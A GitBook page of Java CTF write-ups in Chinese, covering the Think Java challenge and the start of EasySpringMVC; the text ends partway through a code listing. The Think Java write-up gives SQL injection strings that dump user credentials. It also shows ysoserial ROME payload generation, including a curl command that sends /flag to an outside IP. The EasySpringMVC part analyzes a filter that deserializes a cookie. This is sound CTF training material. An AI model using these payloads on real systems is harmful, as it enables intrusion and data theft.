
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Java相关题型复现 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../styles/website.css">
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="ROME逐步分析.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="CommonsCollections逐步分析.html">
            
                <a href="CommonsCollections逐步分析.html">
            
                    
                    CommonsCollections逐步分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <a target="_blank" href="https://github.com/AmTrain-Ricky/amtrain-ricky.github.io/tree/main/javanote">
            
                    
                    fastjson逐步分析(PDF)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="Java XML反序列化漏洞.html">
            
                <a href="Java XML反序列化漏洞.html">
            
                    
                    Java XML反序列化漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="ROME逐步分析.html">
            
                <a href="ROME逐步分析.html">
            
                    
                    ROME逐步分析
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.6" data-path="javatest.html">
            
                <a href="javatest.html">
            
                    
                    Java相关题型复现
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Java相关题型复现</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="java-test">Java Test</h1>
<blockquote>
<p>&#x8BB0;&#x5F55;Java&#x9898;&#x7684;&#x8FC7;&#x7A0B;</p>
</blockquote>
<h2 id="maven&#x9879;&#x76EE;&#x5FEB;&#x901F;&#x642D;&#x5EFA;">maven&#x9879;&#x76EE;&#x5FEB;&#x901F;&#x642D;&#x5EFA;</h2>
<p><img src="img/1068501-20180914191722384-1695467171.png" alt="img"> </p>
<h2 id="&#x7F51;&#x9F0E;&#x676F;-2020-&#x6731;&#x96C0;&#x7EC4;think-java">[&#x7F51;&#x9F0E;&#x676F; 2020 &#x6731;&#x96C0;&#x7EC4;]Think Java</h2>
<p>&#x6E90;&#x7801;&#x7ED9;&#x4E86; class, &#x53CD;&#x7F16;&#x8BD1;&#x5BA1;&#x8BA1;, &#x4E3B;&#x8981;&#x662F; Test.class &#x548C; sqlDict.class, Test.class &#x8C03;&#x7528; sqlDict.class</p>
<pre><code class="lang-java"><span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping</span>({<span class="hljs-string">&quot;/common/test&quot;</span>})
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Test</span><span class="hljs-params">()</span> </span>{
    }

    <span class="hljs-meta">@PostMapping</span>({<span class="hljs-string">&quot;/sqlDict&quot;</span>})
    <span class="hljs-meta">@Access</span>
    <span class="hljs-meta">@ApiOperation</span>(<span class="hljs-string">&quot;&#x4E3A;&#x4E86;&#x5F00;&#x53D1;&#x65B9;&#x4FBF;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x5178;&#x67E5;&#x8BE2;&quot;</span>)
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResponseResult <span class="hljs-title">sqlDict</span><span class="hljs-params">(String dbName)</span> <span class="hljs-keyword">throws</span> IOException </span>{
        List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;abc@12345&quot;</span>);
        <span class="hljs-keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);
    }
}
</code></pre>
<p>&#x6839;&#x636E; import &#x548C; api&#x63A5;&#x53E3;&#x5224;&#x5B9A;&#x4ED6;&#x662F; swagger-ui</p>
<pre><code>import io.swagger.annotations.ApiOperation;
</code></pre><p>&#x5E38;&#x7528;&#x7684;&#x6709; swagger-ui.html, &#x8FDB;&#x5165;&#x540E;&#x4E24;&#x4E2A;&#x63A5;&#x53E3;, &#x4E00;&#x4E2A;&#x9700;&#x8981;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x767B;&#x5F55;, &#x53E6;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x5B57;&#x5178;&#x67E5;&#x8BE2;</p>
<pre><code>String sql = &quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &apos;&quot; + dbName + &quot;&apos; and table_name=&apos;&quot; + TableName + &quot;&apos;;&quot;;
</code></pre><p>&#x76F4;&#x63A5;&#x62FC;&#x63A5;&#x7684;&#x6240;&#x4EE5;&#x5C1D;&#x8BD5;&#x6709;&#x6CA1;&#x6709; sql&#x6CE8;&#x5165;, jdbc&#x8FDE;&#x63A5;&#x793A;&#x4F8B;</p>
<pre><code>jdbc:mysql://127.0.0.1:3306/name?useUnicode=true&amp;xx=xxxx&amp;xx=xx
</code></pre><p>&#x5C1D;&#x8BD5; sql&#x6CE8;&#x5165;</p>
<pre><code>?dbName=myapp?useUnicode=-1&apos;union+select+database()%23
?dbName=myapp?useUnicode=-1&apos;union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&apos;myapp&apos;%23
?dbName=myapp?useUnicode=-1&apos;union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&apos;user&apos;%23
?dbName=myapp?useUnicode=-1&apos;union+select+group_concat(id,&apos;~&apos;,name,&apos;~&apos;,pwd)+from+user%23
</code></pre><p>&#x5F97;&#x5230;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;</p>
<pre><code>admin/admin@Rrrr_ctf_asde
</code></pre><p>&#x767B;&#x5F55;&#x6210;&#x529F;&#x540E;&#x7ED9;&#x4E86;&#x4E00;&#x957F;&#x4E32;data</p>
<pre><code>{
    &quot;data&quot;:&quot;Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu&quot;,
    &quot;msg&quot;:&quot;&#x767B;&#x5F55;&#x6210;&#x529F;&quot;,
    &quot;status&quot;:2,
    &quot;timestamps&quot;:1627307693537
}
</code></pre><blockquote>
<p>&#x4E0B;&#x65B9;&#x7684;&#x7279;&#x5F81;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6807;&#x5FD7;&#x53C2;&#x8003;:</p>
<p>&#x4E00;&#x6BB5;&#x6570;&#x636E;&#x4EE5;<strong>rO0AB</strong>&#x5F00;&#x5934;&#xFF0C;&#x4F60;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x8FD9;&#x4E32;&#x5C31;&#x662F;JAVA&#x5E8F;&#x5217;&#x5316;base64&#x52A0;&#x5BC6;&#x7684;&#x6570;&#x636E;&#x3002;</p>
<p>&#x6216;&#x8005;&#x5982;&#x679C;&#x4EE5;<strong>aced</strong>&#x5F00;&#x5934;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x5C31;&#x662F;&#x8FD9;&#x4E00;&#x6BB5;java&#x5E8F;&#x5217;&#x5316;&#x7684;16&#x8FDB;&#x5236;&#x3002;</p>
</blockquote>
<p>&#x53C2;&#x8003;&#x540E;&#x5148;&#x5C06;&#x6570;&#x636E;&#x505A;&#x5904;&#x7406;</p>
<pre><code># -*-coding:utf-8-*-
# python 2.7
import base64

data = &quot;rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu&quot;
r = base64.b64decode(data).encode(&apos;hex&apos;)
print(r)
</code></pre><p><a href="https://github.com/NickstaDB/SerializationDumper/releases/tag/1.13" target="_blank">&#x4E0B;&#x8F7D;</a> , &#x4F7F;&#x7528;</p>
<pre><code>java -jar SerializationDumper-v1.13.ja
r aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c0002696474
00104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372
000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e
756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 24 - 0x00 18
        Value - cn.abc.core.model.UserVo - 0x636e2e6162632e636f72652e6d6f64656c2e55736572566f
      serialVersionUID - 0x76 46 43 31 7b 04 f4 3a
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 2 - 0x00 02
            Value - id - 0x6964
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 16 - 0x00 10
              Value - Ljava/lang/Long; - 0x4c6a6176612f6c616e672f4c6f6e673b
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 02
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 03
    classdata
      cn.abc.core.model.UserVo
        values
          id
            (object)
              TC_OBJECT - 0x73
                TC_CLASSDESC - 0x72
                  className
                    Length - 14 - 0x00 0e
                    Value - java.lang.Long - 0x6a6176612e6c616e672e4c6f6e67
                  serialVersionUID - 0x3b 8b e4 90 cc 8f 23 df
                  newHandle 0x00 7e 00 04
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 1 - 0x00 01
                  Fields
                    0:
                      Long - L - 0x4a
                      fieldName
                        Length - 5 - 0x00 05
                        Value - value - 0x76616c7565
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 16 - 0x00 10
                        Value - java.lang.Number - 0x6a6176612e6c616e672e4e756d626572
                      serialVersionUID - 0x86 ac 95 1d 0b 94 e0 8b
                      newHandle 0x00 7e 00 05
                      classDescFlags - 0x02 - SC_SERIALIZABLE
                      fieldCount - 0 - 0x00 00
                      classAnnotations
                        TC_ENDBLOCKDATA - 0x78
                      superClassDesc
                        TC_NULL - 0x70
                newHandle 0x00 7e 00 06
                classdata
                  java.lang.Number
                    values
                  java.lang.Long
                    values
                      value
                        (long)1 - 0x00 00 00 00 00 00 00 01
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 07
                Length - 5 - 0x00 05
                Value - admin - 0x61646d696e
</code></pre><p>&#x6700;&#x4E0B;&#x65B9;&#x6709;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x5305;&#x542B;&#x7740;admin&#x5B57;&#x6BB5;&#xFF0C;&#x5B83;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x4FDD;&#x5B58;&#x7740;&#x5B9E;&#x8D28;&#x4FE1;&#x606F;&#x7684;&#x6570;&#x636E;&#x5757;, &#x5F53;&#x628A;&#x5E8F;&#x5217;&#x5316;&#x7684;token&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;Authorization&#x53BB;&#x5370;&#x8BC1;&#x8FD9;&#x4E2A;UI&#x7684;user/current&#x63A5;&#x53E3;&#x3002;&#x4ED6;&#x4E5F;&#x4F1A;&#x663E;&#x793A;&#x6210;&#x529F;&#x767B;&#x5F55;&#x3002;&#x8FD9;&#x8BF4;&#x660E;&#xFF0C;&#x4ED6;&#x4F1A;&#x5728;current&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF01;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x5408;&#x9002;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5185;&#x5BB9;&#x6765;&#x6784;&#x9020;getshell</p>
<p><strong>&#x5982;&#x4F55;&#x6784;&#x9020;?</strong></p>
<p>java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5DE5;&#x5177;<a href="https://github.com/frohoff/ysoserial" target="_blank"><strong>ysoserial</strong></a></p>
<p><strong>ysoserial</strong>&#x7528;&#x6CD5;:&#x4EE5;ROME&#x548C;URLDNS&#x4E3E;&#x4F8B;</p>
<p>&#x5373;&#x7528;ROME(&#x6211;&#x73B0;&#x5728;&#x7684;&#x8BA4;&#x77E5;&#x5C31;&#x662F;&#x4ED6;&#x6BCF;&#x4E00;&#x79CD;&#x90FD;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x6BD4;&#x5982;rome&#x53EF;&#x4EE5;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;URLDNS&#x53EF;&#x4EE5;&#x8FDB;&#x884C;dns&#x56DE;&#x663E;)&#x3002;</p>
<pre><code>java -jar ysoserial.jar ROME &quot;calc.exe&quot; &gt; h3zh1.bin

java -jar ysoserial.jar URLDNS &quot;http://xxx&quot; &gt; h3zh1.bin
</code></pre><p>&#x518D;&#x8F6C;base64&#x5373;&#x53EF;, &#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x6CA1;&#x6709; bash &#x6240;&#x4EE5; shell &#x5F39;&#x4E0D;&#x51FA;&#x6765;, &#x7528; curl &#x6570;&#x636E;&#x5916;&#x5E26;(&#x547D;&#x4EE4;&#x6267;&#x884C;&#x90A3;&#x4E2A; payload&#x4E0D;&#x597D;&#x751F;&#x6210;)</p>
<pre><code>java -jar ysoserial.jar ROME &quot;curl http://39.97.114.43:8888 -F file=@/flag&quot; &gt; outcome.bin

java -jar ysoserial.jar ROME &quot;curl http://39.97.114.43:8888 -d @/flag&quot; &gt; outcome.bin
</code></pre><p>&#x7136;&#x540E;&#x5199;&#x4E2A;&#x52A0;&#x5BC6;&#x811A;&#x672C;burpsuite&#x6253;&#x8FC7;&#x53BB;&#x516C;&#x7F51;&#x76D1;&#x542C;&#x5373;&#x53EF;</p>
<pre><code># -*-coding:utf-8-*-
# python 2.7
import base64

file = open(&quot;outcome.bin&quot;, &quot;rb&quot;)
now = file.read()
ba = base64.b64encode(now)
# print(ba)
print(&quot;Bearer &quot;+ba)  #&#x53EF;&#x4EE5;&#x89E3;&#x6CE8;&#x91CA;&#x6B64;&#x6BB5;&#xFF0C;&#x5E76;&#x6CE8;&#x91CA;&#x4E0A;&#x4E00;&#x6761;print,&#x4FBF;&#x4E8E;&#x5FEB;&#x901F;&#x6D4B;&#x8BD5;
file.close()
</code></pre><h2 id="vn2020-java&#x53CD;&#x5E8F;&#x5217;&#x5316;easyspringmvc">[V&amp;N2020 java&#x53CD;&#x5E8F;&#x5217;&#x5316;]EasySpringMVC</h2>
<p>&#x7ED9;&#x4E86; war&#x5305;, &#x89E3;&#x538B;&#x540E;&#x901A;&#x8FC7; fernflower.jar &#x8FDB;&#x884C;&#x53CD;&#x7F16;&#x8BD1;&#x5F97;&#x5230;&#x539F;&#x6709;&#x7684; java&#x6587;&#x4EF6;</p>
<pre><code>java -jar fernflower.jar .\springmvcdemo_2 .\springmvcdemo
</code></pre><p>IDEA &#x6CA1;&#x6709;Spring&#x9879;&#x76EE;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</p>
<pre><code>IDEA&#x662F;2020&#x7248;&#x672C;&#xFF0C;&#x4E14;&#x662F;&#x65D7;&#x8230;&#x7248;&#xFF0C;&#x4F46;&#x4ECA;&#x5929;&#x60F3;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;SpringMVC&#x9879;&#x76EE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53D1;&#x73B0;&#x6CA1;&#x6709;Spring&#x9009;&#x9879;&#x3002;
&#x89E3;&#x51B3;&#x65B9;&#x6848;: &#x6309;&#x5FEB;&#x6377;&#x952E;&#x7EC4;&#x5408;ctrl+alt+shift+/&#xFF0C;&#x7136;&#x540E;&#x9009;register&#xFF0C;&#x63A5;&#x7740;&#x627E;&#x5230;javaee.legacy.project.wizard&#xFF0C;&#x9009;&#x4E2D;&#xFF0C;close&#x5C31;&#x597D;&#x4E86;
</code></pre><p>&#x5728;IDEA&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;Spring&#x9879;&#x76EE;&#xFF0C;&#x5E76;&#x52FE;&#x9009;SpringMVC, &#x5C06;&#x53CD;&#x7F16;&#x8BD1;&#x540E;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x7684;com&#x5305;&#x62D6;&#x5230;src&#x76EE;&#x5F55;&#xFF0C;lib&#x76EE;&#x5F55;&#x7684;jar&#x590D;&#x5236;&#x5230;lib&#x76EE;&#x5F55;&#xFF0C;WEB-INF&#x76EE;&#x5F55;&#x4E5F;&#x66FF;&#x6362;&#x6389;,  &#x7136;&#x540E;&#x5728;File-&gt;Project Structure&#x6DFB;&#x52A0;lib&#x7684;&#x8DEF;&#x5F84;</p>
<p>&#x63A5;&#x7740;,  &#x6DFB;&#x52A0;tomcat&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;ApplicationContext&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x8868;&#x793A;webapp&#x7684;&#x8BBF;&#x95EE;&#x6839;&#x8DEF;&#x5F84;</p>
<p>&#x7136;&#x540E;&#x542F;&#x52A8;&#x5373;&#x53EF;&#x8BBF;&#x95EE; webapp, &#x4F46;&#x662F;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x6536;&#x83B7;,  &#x770B;&#x770B;web.xml, web.xml&#x662F;J2EE&#x5B9A;&#x4E49;&#x7684;&#x63CF;&#x8FF0;&#x8FD9;&#x4E2A;webapp&#x7684;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x3002;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#x3002; </p>
<pre><code class="lang-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>clientinfo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>clientinfo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.form<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>
</code></pre>
<p>&#x6700;&#x4E0B;&#x9762;&#x8FD9;&#x6BB5;</p>
<pre><code>    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;
        &lt;url-pattern&gt;*.form&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre><p>&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7528;servlet-mapping&#x6307;&#x660E;&#x6240;&#x6709;*.form&#x683C;&#x5F0F;&#x8DEF;&#x5F84;&#x7684;&#x8BBF;&#x95EE;&#x4EA4;&#x7ED9;&#x540D;&#x4E3A;dispatcher&#x7684;servlet&#x5904;&#x7406;&#x3002;servlet&#x5C31;&#x662F;&#x5904;&#x7406;HTTP&#x8BF7;&#x6C42;&#x7684;&#x6838;&#x5FC3;&#x7C7B;&#x3002;</p>
<pre><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><p>&#x518D;&#x770B;&#x8FD9;&#x4E00;&#x6BB5;&#xFF0C;&#x8868;&#x660E;&#x8FD9;&#x4E2A;dispatcher servlet&#x662F;&#x4E00;&#x4E2A;org.springframework.web.servlet.DispatcherServlet&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x4E2A;webapp&#x4F7F;&#x7528;&#x4E86;Spring&#x6846;&#x67B6;&#x3002; </p>
<pre><code>    &lt;filter&gt;
        &lt;filter-name&gt;clientinfo&lt;/filter-name&gt;
        &lt;filter-class&gt;com.filters.ClentInfoFilter&lt;/filter-class&gt;
    &lt;/filter&gt;
    &lt;filter-mapping&gt;
        &lt;filter-name&gt;clientinfo&lt;/filter-name&gt;
        &lt;servlet-name&gt;*&lt;/servlet-name&gt;
    &lt;/filter-mapping&gt;
</code></pre><p>&#x8FD9;&#x4E00;&#x6BB5;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A; filter,  &#x8868;&#x793A;&#x5BF9;&#x6240;&#x6709;servlet&#x7684;&#x8BBF;&#x95EE;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x7ECF;&#x8FC7;com.filters.ClentInfoFilter&#x7C7B;&#x3002;filter&#x7684;&#x4F5C;&#x7528;&#x4E00;&#x822C;&#x662F;&#x5728;HTTP&#x8BF7;&#x6C42;&#x5230;&#x8FBE;servlet&#x4E4B;&#x524D;&#x6216;&#x4E4B;&#x540E;&#xFF0C;&#x5BF9;HTTP&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x6BD4;&#x5982;&#x68C0;&#x67E5;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x662F;&#x5426;&#x62E5;&#x6709;&#x6743;&#x9650;&#x3002; </p>
<p>&#x5728;&#x5BF9;Controller&#x4ED4;&#x7EC6;&#x6392;&#x67E5;&#x540E;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x4EFB;&#x4F55;&#x6709;&#x7528;&#x4FE1;&#x606F;&#xFF0C;&#x5173;&#x6CE8;&#x70B9;&#x8F6C;&#x79FB;&#x5230;&#x8FD9;&#x4E2A;filter&#x4E0A;&#x3002; </p>
<pre><code class="lang-java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>{
      Cookie[] cookies = ((HttpServletRequest)request).getCookies();
      <span class="hljs-keyword">boolean</span> exist = <span class="hljs-keyword">false</span>;
      Cookie cookie = <span class="hljs-keyword">null</span>;
      <span class="hljs-keyword">if</span>(cookies != <span class="hljs-keyword">null</span>) {
         Cookie[] encoder = cookies;
         <span class="hljs-keyword">int</span> e = cookies.length;

         <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> bytes = <span class="hljs-number">0</span>; bytes &lt; e; ++bytes) {
            Cookie cinfo = encoder[bytes];
            <span class="hljs-keyword">if</span>(cinfo.getName().equals(<span class="hljs-string">&quot;cinfo&quot;</span>)) {
               exist = <span class="hljs-keyword">true</span>;
               cookie = cinfo;
               <span class="hljs-keyword">break</span>;
            }
         }
      }
</code></pre>
<p>&#x83B7;&#x53D6;&#x7684;cookie &#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x683C;&#x5F0F;, &#x7136;&#x540E;&#x518D;&#x4F20;&#x7ED9;encoder &#x6570;&#x7EC4;, &#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x627E;&#x5230;cookie &#x4E2D;&#x662F;&#x5426;&#x6709;&#x547D;&#x540D;&#x4E3A; cinfo &#x7684;cookie, &#x6709;&#x5C31;&#x8D4B;&#x503C;exist&#x4E3A;true, &#x8BFB;&#x53D6;&#x7ED3;&#x675F;&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x8D70;</p>
<pre><code class="lang-java">      <span class="hljs-keyword">byte</span>[] var20;
      <span class="hljs-keyword">if</span>(exist) {
         String var16 = cookie.getValue();
         Decoder var18 = Base64.getDecoder();
         var20 = var18.decode(var16);
         ClientInfo var21 = <span class="hljs-keyword">null</span>;
         <span class="hljs-keyword">if</span>(!var16.equals(<span class="hljs-string">&quot;&quot;</span>) &amp;&amp; var20 != <span class="hljs-keyword">null</span>) {
            <span class="hljs-keyword">try</span> {
               var21 = (ClientInfo)Tools.parse(var20);
            } <span class="hljs-keyword">catch</span> (Exception var14) {
               var14.printStackTrace();
            }
         } <span class="hljs-keyword">else</span> {
</code></pre>
